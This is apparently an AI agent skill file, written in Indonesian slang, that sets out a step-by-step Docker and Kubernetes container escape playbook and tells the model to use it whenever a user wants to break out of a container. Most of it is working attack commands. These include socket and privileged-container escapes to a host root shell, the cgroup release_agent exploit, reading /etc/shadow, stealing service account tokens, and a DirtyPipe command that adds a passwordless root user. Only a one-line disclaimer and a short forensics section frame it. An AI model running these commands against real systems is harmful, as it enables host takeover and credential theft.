---
name: container-escape
description: |
  Container escape & docker security dalam Bahasa Indonesia. Gunakan saat user mau escape Docker container, container breakout, atau analisis container security.
  kata kunci: docker escape, container escape, docker breakout, container breakout, privileged container, docker security, kubernetes escape, k8s escape, namespace escape, cgroup escape, runc escape, kernel exploit container, docker socket mount, procfs escape.
---

# Container Escape — Docker & Kubernetes Security

> **Disclaimer:** Skill ini HANYA untuk container yang lo miliki atau dapat izin (CTF, lab, red team engagement). Escape tanpa izin = ilegal.

---

## Prerequisites

```bash
# Tools di dalam container
ls -la /proc/1/ns/
cat /proc/1/cgroup
mount
df -h

# Tools di host (kalau lo udah ada akses)
docker ps
kubectl get pods
```

---

## Workflow Step-by-Step

### Tahap 1 — Container Enumeration

> **GOLDEN RULE:** Enumerate dulu baru escape. Jangan asal ngebreak.

```bash
# 1. Cek apakah lo di container
cat /proc/1/cgroup | grep docker
ls -la /.dockerenv
hostname

# 2. Cek privileges
cat /proc/1/status | grep -i cap
# CapPrm: 0000003fffffffff = full capabilities

# 3. Cek mounted volumes
mount | grep -E "docker|overlay"
df -h

# 4. Cek docker socket
ls -la /var/run/docker.sock

# 5. Cek processes
ps aux

# 6. Cek network
ip addr
cat /etc/hosts
```

**Privilege indicators:**

| Indicator | Artinya |
|-----------|---------|
| `/var/run/docker.sock` mounted | Bisa kontrol Docker daemon |
| `--privileged` flag | Full capabilities + device access |
| Capabilities: `CAP_SYS_ADMIN` | Bisa mount filesystem |
| Capabilities: `CAP_SYS_PTRACE` | Bisa debug process host |
| PID 1 = process host | Host namespace leaked |
| `/proc/sys/kernel/core_pattern` writable | Bisa overwrite → code exec |

---

### Tahap 2 — Docker Socket Escape

> **Paling gampang.** Kalau docker socket mounted, lo bisa jadi root di host.

```bash
# 1. Install docker CLI (kalau belum ada)
apt install docker.io -y

# 2. List container di host
docker -H unix:///var/run/docker.sock ps

# 3. Buat container baru dengan host filesystem
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host

# 4. Sekarang lo ada shell sebagai root di host
cat /host/etc/shadow
```

**Alternatif: mount host filesystem**
```bash
docker -H unix:///var/run/docker.sock run -v /:/host alpine cat /host/etc/passwd
```

---

### Tahap 3 — Privileged Container Escape

> Container dengan `--privileged` punya semua capabilities + akses ke device.

#### Method 1: cgroup release_agent (CVE-2022-0492)

```bash
# 1. Buat cgroup
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# 2. Enable release_agent
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# 3. Buat script yang jalan di host
cat > /cmd <<EOF
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd

# 4. Trigger
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /output
```

#### Method 2: procfs escape

```bash
# 1. Find host PID (biasanya PID 1 host)
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# 2. Atau via /proc
ls -la /proc/1/root/
```

#### Method 3: Device access

```bash
# 1. List devices
ls /dev/

# 2. Mount host disk
mkdir /hostdisk
mount /dev/sda1 /hostdisk
chroot /hostdisk
```

---

### Tahap 4 — Docker Misconfiguration

#### 4.1 Docker Group Membership

```bash
# Cek apakah user di docker group
id
# uid=1000(user) gid=1000(user) groups=1000(user),999(docker)

# Langsung escape
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

#### 4.2 Container with Host PID Namespace

```bash
# Cek PID namespace
ls -la /proc/1/ns/pid
# Kalau sama dengan host PID namespace:
cat /proc/1/cmdline
# Bisa akses semua process host
```

#### 4.3 Writable /proc/sys/kernel

```bash
# Overwrite core_pattern → code exec
echo '|/tmp/evil.sh' > /proc/sys/kernel/core_pattern
```

---

### Tahap 5 — Kubernetes Escape

#### 5.1 Service Account Token Abuse

```bash
# 1. Cek service account token
ls /var/run/secrets/kubernetes.io/serviceaccount/
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# 2. Gunakan token untuk akses API
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=$(cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt)

# 3. List pods
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/default/pods

# 4. Exec ke pod lain
kubectl exec -it other-pod -- /bin/sh
```

#### 5.2 Privileged Pod Escape

```bash
# Kalau pod privileged + hostPID:
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Atau mount host disk:
mkdir /hostfs
mount /dev/sda1 /hostfs
chroot /hostfs
```

#### 5.3 HostPath Mount Abuse

```bash
# Kalau hostPath mounted:
ls /host/
cat /host/etc/shadow

# Write to host filesystem
echo 'pwned' > /host/tmp/pwned
```

#### 5.4 Container Breakout via Kernel Exploit

```bash
# Kalau kernel version vulnerable:
# DirtyPipe (CVE-2022-0847) - kernel 5.8+
# DirtyCow (CVE-2016-5195) - kernel < 4.8.3
# PwnKit (CVE-2021-4034) - polkit

# Compile & run exploit
./dirtypipe /etc/passwd 1 "root2::0:0::/root:/bin/bash"
```

---

### Tahap 6 — Container Forensics

```bash
# 1. Inspect container
docker inspect <container_id>

# 2. Check history
docker history <image>

# 3. Export container
docker export <container_id> > container.tar

# 4. Extract & analyze
tar xf container.tar -C extracted/

# 5. Check for secrets
grep -r "password" extracted/
grep -r "secret" extracted/
grep -r "key" extracted/
```

---

## Escape Techniques Summary

| Technique | Prerequisites | Difficulty |
|-----------|--------------|------------|
| Docker socket | Socket mounted | Easy |
| Privileged container | `--privileged` | Medium |
| Docker group | User in docker group | Easy |
| cgroup escape | Privileged or CAP_SYS_ADMIN | Medium |
| procfs escape | Host PID namespace | Medium |
| K8s SA token | SA token mounted | Easy |
| K8s privileged | Privileged pod | Medium |
| Kernel exploit | Vulnerable kernel | Hard |

---

## Tool Cheat Sheet

| Tool | Fungsi |
|------|--------|
| docker | Container management |
| kubectl | Kubernetes CLI |
| nsenter | Namespace enter |
| capsh | Capabilities check |
| linpeas | Privilege escalation |
| kube-hunter | K8s vulnerability scanner |
| trivy | Container image scanner |

---

## Resources

- **Docker security**: https://docs.docker.com/engine/security/
- **Kubernetes security**: https://kubernetes.io/docs/concepts/security/
- **GTFOBins**: https://gtfobins.github.io/
- **HackTheBox Container labs**: https://www.hackthebox.com/

---

*End skill — gas lanjut, jangan mandek ya tod.*

---

## See Also (Module Terkait)

| Jika Task Lo... | Module Lain yang Relevan |
|-----------------|-------------------------|
| Host access after escape | `core/exploit-dev/linux-privesc/SKILL.md` — Linux privesc |
| Container networking | `core/network-recon/SKILL.md` — Network recon |
| K8s API abuse | `core/active-directory/SKILL.md` — AD/K8s |
| Malicious container | `core/malware-analysis/SKILL.md` — Malware analysis |
| Container forensics | `core/forensics/SKILL.md` — Forensics |
